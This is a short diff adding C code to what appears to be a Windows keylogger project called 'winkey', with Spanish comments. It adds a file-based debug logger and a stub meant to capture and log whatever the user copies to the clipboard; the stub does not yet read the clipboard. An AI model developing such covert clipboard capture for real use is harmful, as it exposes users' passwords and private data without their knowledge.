@@ -1,0 +1,48 @@
+#include "winkey.h"
+// funcion para debuggear y ver en un archivo
+#include <stdarg.h> 
+
+void DebugLog(const char* format, ...)
+{
+    FILE* debugFile;
+    // Usamos una ruta fija en ProgramData para asegurar los permisos
+    errno_t err = fopen_s(&debugFile, "C:\\ProgramData\\debug_winkey.log", "a");
+    if (err == 0 && debugFile != NULL) {
+        // Añadir un timestamp
+        time_t now = time(NULL);
+        struct tm t;
+        localtime_s(&t, &now);
+        fprintf(debugFile, "[%02d:%02d:%02d] ", t.tm_hour, t.tm_min, t.tm_sec);
+
+        // Escribir el mensaje formateado
+        va_list args;
+        va_start(args, format);
+        vfprintf(debugFile, format, args);
+        va_end(args);
+
+        fprintf(debugFile, "\n");
+        fclose(debugFile);
+    }
+}
+
+/**
+    Leer el texto actual del portapapeles de Windows.
+    Compararlo con lo que tenemos guardado en lastClipboardText.
+    Si son diferentes: ¡Significa que el usuario ha copiado algo nuevo! Lo guardamos en el log y actualizamos lastClipboardText con este nuevo texto.
+    Si son iguales: No hacemos nada
+    Usar malloc para guardar mas espacio?
+ */
+
+// variable estatica para recordar el ultimo texto guardado
+//static char lastClipboardText[512] = {0};
+
+// funcion para registrar el contenido del portapapeles
+void LogClipboardIfChanged(void)
+{
+    // Comprobamos si el archivo de log esta abierto
+    if (!logFile) {
+        DebugLog("El archivo de log principal no está abierto. Saliendo.");
+        return ;
+    }
+    DebugLog("El archivo de log esta abierto\n.");
+}
